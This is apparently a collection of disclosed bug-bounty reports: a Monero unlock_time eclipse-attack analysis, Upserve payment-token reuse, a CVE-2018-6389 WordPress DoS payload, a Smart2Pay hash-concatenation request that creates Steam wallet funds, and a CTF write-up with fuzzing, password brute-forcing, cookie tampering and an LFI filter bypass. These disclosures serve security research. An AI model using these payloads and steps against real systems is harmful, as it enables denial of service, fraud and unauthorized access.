Through consuming outputs locked by carefully chosen unlock_time values, it is possible to poll the local time of other nodes. The attacker can generate any number of transactions encumbered with a spread of unlock_time values, for example with an unlock_time 20 blocks per the expected block time into the future and then spread out over intervals of seconds. The attacker then creates transactions consuming these locked outputs and connects two nodes to the node she wants to spy on. She sends the transaction from one of the nodes to the node she wants to spy on and then checks if the other node receives the transaction. If the consumed unlock_time is invalid by the consensus rules for the attacker and the greater network, but valid for the surveiled node, the attacker will get the transaction relayed to her other node as well. This then indicates that the local time on the surveiled node matches the time on the attacker's transaction. Using a binary search methodology, the attacker can then pinpoint the node's time within a precision of seconds.

If such a node is found with a different clock (running late or early), or if the attacker can manipulate a node's local time through another channel, we identified two additional ways to exploit the current unlock_time validation.

Assume that a node has a clock running forward (showing a higher unix time). The attacker then creates a transaction consuming at least one output with a high enough unlock_time that it is invalid by the clocks of most node's on the netowrk, but valid for the node where the clock runs forward. If the attacker relays this transaction to the victim's node, the node will validate it as a valid transaction. This is especially useful for the attacker in the context of mining. For Example if the victim's node is a large mining pool, this can be used to make the pool expend work on a block that is not valid with the locked transaction included by the consensus rules of the rest of the network. If the attacker is a mining pool herself, she can use this to increase her profit.

If a node has a clock running behind (showing a lower unix time), the attacker can trick it into thinking that a chain that is valid by the rest of the network's consensus rules, is invalid to the attacked node. By continuously submitting transactions consuming an unlock_time encumbered output with a value just later than the victim node's clock, the node will never accept the network's best chain as valid. This would be a very effective way for an eclipse attack, even allowing the attacker enough time to feed it a "slower" malicious chain without expending too much proof of work.

## Recommendations

We believe that these scenarios are serious enough to warrant a change away from the current consensus rules for interpreting unix time unlock_time values. Consensus rules must react to consensus variables (e.g. miner-reported block time). The local time should not be taken into account any more. Instead, an aggregation of previous block time values should be used.

A similar problem existed in bitcoin's nlocktime field. However this problem was less serious at the time, since the nlocktime semantics are different compared to monero's unlock_time (nlocktime's influence is on the finality of the transaction itself, not a later transaction), and since the last block's timestamp was used instead.  It was fixed through BIP113: https://github.com/bitcoin/bips/blob/master/bip-0113.mediawiki , by using the median timestamp of the past 11 blocks to determine if an unlock time is valid. The fix was also a required step for the deployment of the CSV and CLTV opcodes, which adopt a similar output locking mechanism to the one of monero's unlock_time.

We therefore propose to also use the median timestamp over the past 60 blocks as calculated in https://github.com/monero-project/monero/blob/master/src/cryptonote_core/blockchain.cpp#L3592 , to verify the unlock_time. In fact, it looks like the cryptonote developers intended to implement something along these lines by reading both the function signatures and the comments around this line. Currently this median is used to check that a new block's timestamp is strictly increasing compared to the median. A proof of concept patch was written to use this median timestamp calculation in the unlock time.

Since the exploits do not require changes to the monero software, but rather some minor scripting work to generate the locked transactions, no proof of concept is provided.

## Patch:

We provide a proof of concept patch to the validation code and the wallet code in monero. This should be tested extensively before deploying, since it touches key functionality of monero. We also provide a patch to the wallet code, however this needs some additional discussion, since it touches quite a few unrelated components in its current form.

## Impact

Without any additional assumptions, the attacker can get the local time of another node.
Under the assumption that a node's local time is off, the attacker is able to launch an eclipse attack.
Additionally, if the node is mining, the attack can diminish its profit.

---

### [Payment method token being sent to 3rd party analytics service](https://hackerone.com/reports/637267)

- **Report ID:** `637267`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Upserve 
- **Reporter:** @ctulhu
- **Bounty:** - usd
- **Disclosed:** 2021-09-03T15:06:32.787Z
- **CVE(s):** -

**Vulnerability Information:**

Vulnerability Details:

Payment Tokens can be re-used to link the Credit Card to Another Users Account.

When Linking a Credit Card, a url with Payment_method_token will be generated and then the user will be redirected to the generated url

{F523794}

Then, a Request will be Made to ```orders.upserve.com``` to Finally Link the Credit Card using the payment_method_token


{F523795}


##Reproduction Steps

1.) Create 2 Accounts on https://app.upserve.com/s/upserve-lounge-test-providence-2
 * juandelacruz@gmail.com
 * juandoe@gmail.com

2.) Add a Credit Card
 * 4834422077410033|01|2023|730  - for juandelacruz@gmail.com
 * 4834422073330870|06|2024|582 - juandoe@gmail.com

3.) While Adding the Credit Cards, Make sure to Capture all Request.

4.) Remove the Credit Card linked to the account of juandoe@gmail.com

5.) Using the payment_method_token of juandelacruz@gmail.com we will link his credit card to the account of juandoe@gmail.com

6.) Your Credit Card Will be linked to the account of juandoe@gmail.com.


I am Confused:
* The ```last_four":"3579"``` is confusing me here, it doesnt really validate the last 4 digit it just accepts what ever is on the request, you can change it to any 4 digit numbers.
*  If you Added a MasterCard Credit Card, if the card_type is set to visa, it will show as a Visa Card.


Could you Please Verify on your Endpoint? 

* "payment_method_token":"a0543b88d2ddae5d2bd5f8fe"
* ctulhu@wearehackerone.com

also

Important Details Such as Payment Method Tokens are shared thru 3rd Party Analytics. 

{F523791}

##Proof of Concept:

{F523813}

## Impact

If any attacker can access the 3rd party analytics account, they can get the payment method token of upserve users and use the tokens to link any credit cards to their account and cause a monetary impact to Upserve, a merchant, or a customer  ( creating a payment method they dont own)

* Large Scale Fraud

**Summary (team):**

A payment method token represents an individual payment card (credit or debit) and is unique to each merchant (i.e. one credit card will have a different token at Merchant A and Merchant B). These tokens may only be used with the merchant that generated them. 

When using Online Ordering, payment method tokens were inadvertently being sent to a 3rd party analytics service. The 3rd party service was not storing the tokens. The exposure is quite limited because to make use of the token an attacker would have had to be positioned within the 3rd party service.

Our configuration has been updated to no longer send these tokens to the service.

---

### [CVE-2018-6389 exploitation - using scripts loader](https://hackerone.com/reports/925425)

- **Report ID:** `925425`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** MTN Group
- **Reporter:** @lmhu
- **Bounty:** - usd
- **Disclosed:** 2021-08-18T08:51:19.932Z
- **CVE(s):** CVE-2018-6389

**Vulnerability Information:**

**Issue Description**
Unauthenticated attackers can cause a denial of service (resource consumption) by using the large list of registered .js files (from wp-includes/script-loader.php) to construct a series of requests to load every file many times. 
The vulnerability is registered as [CVE-2018-6389] #761722 #752010 #753491 #335177 

**CVE ID Risk Score**
[CVE-2018-6389 7.5](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389)

Platform(s) Affected: [website]
*.[https://www.mtn.zm/wp-admin/load-scripts.php?load=](https://www.mtn.zm/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter)

###Steps To Reproduce:
  * Open Vulnerability url - open directory ``/wp-admin/load-scripts.php?load=``
  * Add ``parameter-vulnerable`` in request header
  * In request header using GET-Method
  * Show url opened , and check in network websites has been vulnerable ``stack-red``
  * Response has been truncated

**Payloads Vulnerabilities**
```
eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter

```
**How to fix:**
```javascript
RewriteCond %{QUERY_STRING} ^.{1000,}$
RewriteRule ^WP-ADMIN/LOAD-SCRIPTS.PHP$ - f
```
  * add this to your .htaccess

**Proof On Concept :** F909802

## Impact

CVE-2018-6389

---

### [Modify in-flight data to payment provider Smart2Pay](https://hackerone.com/reports/1295844)

- **Report ID:** `1295844`
- **Severity:** Critical
- **Weakness:** Business Logic Errors
- **Program:** Valve
- **Reporter:** @drbrix
- **Bounty:** 7500 usd
- **Disclosed:** 2021-08-10T22:05:36.053Z
- **CVE(s):** -

**Vulnerability Information:**

I have found vulnerability which allows attacker to generate steam wallet balance.

Firstly you will have to change yours steam account email to something like (I will explain why in next steps, amount100 is the important part): 
brixamount100abc@█████

Then go to https://store.steampowered.com/steamaccount/addfunds and click add add funds.

Proceed to payment and select any payment which uses Smart2Pay payment method (przelewy24 in my country).

Click next steps as you would do with normal transaction.

Intercept POST request to https://globalapi.smart2pay.com/

You should see request like that

```
POST / HTTP/1.1
Host: globalapi.smart2pay.com
Content-Length: 388
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://store.steampowered.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://store.steampowered.com/
Accept-Encoding: gzip, deflate
Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

MerchantID=1102&MerchantTransactionID=███&Amount=2000&Currency=PLN&ReturnURL=https%3A%2F%2Fstore.steampowered.com%2Fpaypal%2Fsmart2pay%2F████%2F&MethodID=12&Country=PL&CustomerEmail=brixamount100abc%40███████&CustomerName=_drbrix_&SkipHPP=1&Description=Steam+Purchase&SkinID=101&Hash=███
```


We cant change parameters as there is Hash field with signature, however signature is generated like that hash(ALL_FIELDS_NAMES_VALUES_CONTACTED)

For this request it will look like that:

`hash(MerchantID1102MerchantTransactionID█████Amount2000.....)`

So with our special email we can move parameters in a way that will change amount for us

For example, we can change original `Amount=2000` to `Amount2=000` and after contacting it still will be `Amount2000`

Then we can change email from `CustomerEmail=brixamount100abc%40████` to `CustomerEmail=brix&amount=100&ab=c%40█████████` by this we are adding new field amount with our value.

new request should look like that:

```
POST / HTTP/1.1
Host: globalapi.smart2pay.com
Content-Length: 388
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://store.steampowered.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://store.steampowered.com/
Accept-Encoding: gzip, deflate
Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

MerchantID=1102&MerchantTransactionID=██████&Amount2=000&Currency=PLN&ReturnURL=https%3A%2F%2Fstore.steampowered.com%2Fpaypal%2Fsmart2pay%2F████%2F&MethodID=12&Country=PL&CustomerEmail=brix&amount=100&ab=c%40██████████&CustomerName=_drbrix_&SkipHPP=1&Description=Steam+Purchase&SkinID=101&Hash=█████████
```

Then just pay 1 $ and you should get your money on steam wallet in few hours/days those are some transactions made with this metod:
2███████3
2████9

and this is account i was testing everything on: 
http://steamcommunity.com/profiles/7656██████████

## Impact

I think impact is pretty obvious, attacker can generate money and break steam market, sell game keys for cheap etc.

---

### [Able to use 'PREMIUM TEMPLATES' in 'FREE PLAN' at [https://my.stripo.email/cabinet/#/my-templates/]](https://hackerone.com/reports/1009046)

- **Report ID:** `1009046`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Stripo Inc
- **Reporter:** @xploiterr
- **Bounty:** - usd
- **Disclosed:** 2021-01-25T09:21:30.795Z
- **CVE(s):** -

**Summary (team):**

The vulnerability has been fixed.

---

### [[intensedebate.com] No Rate Limit On The report Functionality Lead To Delete Any Comment When it is enabled](https://hackerone.com/reports/1051734)

- **Report ID:** `1051734`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Automattic
- **Reporter:** @fuzzme
- **Bounty:** - usd
- **Disclosed:** 2021-01-23T10:13:16.191Z
- **CVE(s):** -

**Vulnerability Information:**

Hello

## Summary:

I have found a no rate limit issue on the report functionality.
When you enabled the report functionality on your site, you can set a number of reports before deleting the comment reported.
By default, this functionality is unable, but if you enabled this and you set a $x number of reports before deleting the comment, an attacker can spamming this functionality and delete your comment.


## Steps To Reproduce:

1)  Login at `https://intensedebate.com`
2) Create your own site at `https://intensedebate.com/install`, and follow the instructions (use generic install)
3) After setup your site, go to `https://www.intensedebate.com/user-dashboard`, on click to `Moderate`.

 {F1106120}

4) Go to the comment setting by clicking to `Comments`

{F1106122}

5) Setup the Report functionality by checked the `Enable "Report this comment" button` and set a number of reports before deleting the comment to `10` and save it

{F1106130}

6) Go to your site and add a comment
7) With a other account go to your site, and report the comment manually x10 
8) After spam the Report functionality
9) Refresh the page, and you will see the comment is deleted


## POC 

The video POC `NoRateLimit.mp4`

Thank you,

Fuzzme.

## Impact

Delete any comment in any site when the report functionality is enabled

---

### [Complete destruction of the Grinch server](https://hackerone.com/reports/1065885)

- **Report ID:** `1065885`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** h1-ctf
- **Reporter:** @shamollash
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T17:56:48.652Z
- **CVE(s):** -

**Vulnerability Information:**

# Hackyholidays


# flag 1

First flag is just a matter of reading `/robots.txt` file:

```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```


# flag 2

Visiting `/s3cr3t-ar3a` and opening it with developer tools gets the second flag:


	flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}


It is inserted in the DOM via some obfuscated javascript code buried in `/assets/js/jquery.min.js`


```
h1_0='la',h1_1='}',
h1_2='',
h1_3='f',
h1_4='g',
h1_5='{b7ebcb75',h1_6='8454-',
h1_7='cfb9574459f7',
h1_8='-9100-4f91-';
document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1 );
```


# flag3 /people-rater

The people rater app references entries via something like


	https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0=

where the id parameter is base64 encoding of  `{"id":NUMBER}`

Setting `NUMBER=1` immediatly gives the flag:

```
GET /people-rater/entry?id=eyJpZCI6MX0%3d HTTP/1.1
Host: hackyholidays.h1ctf.com

{ "id":"eyJpZCI6MX0=",
  "name":"The Grinch",
  "rating":"Amazing in every possible way!",
  "flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"
}
```

# flag4 /swag-shop

The swag shop sells some itmes but in order to make a purchase you need a valid login as shown by this request

```
POST /swag-shop/api/purchase HTTP/1.1
Host: hackyholidays.h1ctf.com

id=1
```

which gives the error:

	{"error":"You are not logged in"}

Fuzzing via ffuf we can find `/swag-shop/api/sessions` which contains some interesting stuff

	{"sessions":["eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=","eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="]}
	
In particular one session is longer than others and base64 decoding of it gives

```
{
  "user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
}
```

From javascript source we see that the session cookie is called  `token`.

After many fuzzing tries, the key to proceed is matching **all** response code, even 400 errors:

```
ffuf -u  https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ \
-w common.txt \
-H 'Cookie: token=NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY%3D' \
-t 4 -mc all  -fs 155
```

which finally gives a `user` endpoint which was not known before:

```
sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
stock                   [Status: 200, Size: 167, Words: 8, Lines: 1]
user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
```

Visiting this endpoint we find this error message:

```
GET /swag-shop/api/user HTTP/1.1
Host: hackyholidays.h1ctf.com


HTTP/1.1 400 Bad Request
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 16 Dec 2020 06:52:00 GMT
Content-Type: application/json
Connection: close
Content-Length: 35

{"error":"Missing required fields"}
```

Probably the api wants the user id. Fuzzing again with a list of common parameter names
	
```
ffuf -u  'https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=C7DCCE-0E0DAB-B20226-FC92EA-1B9043' \
-w burp-parameter-names.txt \
-H 'Cookie: token=NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY%3D' \
-t 4 -mc all  -fs 155
```

we understand that the parameter is called (not very surprisingly after all) `uuid`.

This call gets the 4th flag

```
GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1
Host: hackyholidays.h1ctf.com

{
  "uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "username":"grinch",
  "address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},
  "flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}
```

In the end, the session cookie probably was not necessary.


# flag5 /secure-login


The login form seems to indicate that there are different responses for invalid username vs. just wrong password.

So we first try to discover a valid usernameexploting the different responses (with a list of common usernames).
After finding that **access** is a valid user, we try to bruteforce his password, again with a list of very common password.

It's just a matter of seconds to obtain a valid set of credentials:

```
username=access&password=computer
```


After loggin in we get a cookie like this one

	securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D;

which is base64 encoding of

	{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}


Changing the cookie and setting `admin:true` immediately brings us to a page where we can download 

	my_secure_files_not_for_you.zip

This zip file is password protected but john the ripper, and in particular zip2john, will easily reveal the password (`hahahaha`)

	zip2john my_secure_files_not_for_you.zip >zip.hashes
	john zip.hashes ## this gives you the password

Finally in `flag.txt` extracted from zip file we find

	flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}

We also find a gross private picture of the grinch, not very interesting after all.


# flag6 /my-diary/

Grinch diary screams for LFI (Local File Inclusion)

	https://hackyholidays.h1ctf.com/my-diary/?template=entries.html

and at least it's true in its current directory. If we simply try to get the `index.php` we otbain the source code:


```
GET /my-diary/?template=index.php HTTP/1.1
Host: hackyholidays.h1ctf.com

...

<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
```

The usage of `strreplace` has a classic vulnerability: it will not recursively remove all `admin.php` occurences. If we start from 

	XXXadmin.phpYYY
	
what remains is

	XXXYYY
	
So for instance

	adminadmin.php.php --> admin.php


The following payload gets the source code of `secretadmin.php` (which contains the flag), despite the extra layer of "security":


```
GET /my-diary/?template=secretsecretadminadmin.php.phpadminadmin.php.php HTTP/1.1

...

<?php
if( $_SERVER["REMOTE_ADDR"] == '127.0.0.1' ){
?>

[...SNIP...]

flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
```


# flag7 /hate-mail

Examining the mail preview function

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com

preview_markup=%7B%7Btemplate%3Acbdj3_grinch_header.html%7D%7D&preview_data=%7B%22name%22%3A%22Alice%22%2C%22email%22%3A%22alice%40test.com%22%7D
```

our attention is immediately captured by that `{{template:file.html}}`. We begin tampering in search of some kind of LFI, but that only exposes the existance of a `templates/` subdirectory. Directory Index is enabled there, so we get to knwow about a particular file

	38dhs_admins_only_header.html

A simple GET of the file gives us forbidden and also tampering with the `preview_markup` parameter only gives us an error message:


```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
	preview_markup=%7B%7Btemplate%3A38dhs_admins_only_header.html%7D%7D&preview_data=%7B%22name%22%3A%22Alice%22%2C%22email%22%3A%22alice%40test.com%22%7D

...

You do not have access to the file 38dhs_admins_only_header.html
```

